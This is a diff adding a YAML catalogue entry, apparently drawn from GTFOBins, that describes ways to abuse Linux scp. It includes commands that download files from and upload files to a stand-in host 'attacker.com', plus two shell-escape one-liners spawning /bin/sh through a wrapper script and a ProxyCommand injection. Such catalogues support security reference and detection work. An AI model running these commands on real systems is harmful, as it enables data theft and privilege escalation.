@@ -1,0 +1,94 @@
+id: gtfobins/scp/download/unprivileged
+type: binary
+platform: linux
+name: scp
+phases:
+- command-and-control
+capabilities:
+- file-download
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: scp user@attacker.com:/path/to/input-file /path/to/output-file
+references:
+- https://gtfobins.github.io/gtfobins/scp/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        scp:
+          functions:
+            download:
+            - code: scp user@attacker.com:/path/to/input-file /path/to/output-file
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              sender: ssh-server
+            shell:
+            - code: 'echo ''exec /bin/sh 0<&2 1>&2'' >/path/to/temp-file
+
+                chmod +x /path/to/temp-file
+
+                scp -S /path/to/temp-file x x:'
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+            - code: 'scp -o ''ProxyCommand=;/bin/sh 0<&2 1>&2'' x x:'
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+            upload:
+            - code: scp /path/to/input-file user@attacker.com:/path/to/output-file
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              receiver: ssh-server
+    upstream_url: https://gtfobins.github.io/gtfobins/scp/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-download
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: command-and-control
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:a3c250a2f2d3c070b43f972c2b60213ccea3ae5c2ae14b1087e633250f98a806
